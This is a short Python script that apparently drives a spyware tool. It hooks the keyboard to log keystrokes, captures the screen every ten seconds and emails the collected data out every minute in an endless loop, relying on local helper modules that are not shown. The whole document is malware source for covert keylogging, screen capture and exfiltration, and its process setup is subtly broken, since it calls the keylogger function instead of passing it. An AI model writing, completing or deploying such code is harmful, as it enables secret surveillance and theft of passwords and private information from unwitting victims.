import Hook_Keyboard
import PrintScreen
import Email_Connection
import schedule
import multiprocessing


def keylogger():
    Hook_Keyboard.hook_keyboard()


process = multiprocessing.Process(target=keylogger())
schedule.every(10).seconds.do(PrintScreen.take_screen)
schedule.every(1).minutes.do(Email_Connection.sendmail)
process.start()

while True:
    schedule.run_pending()



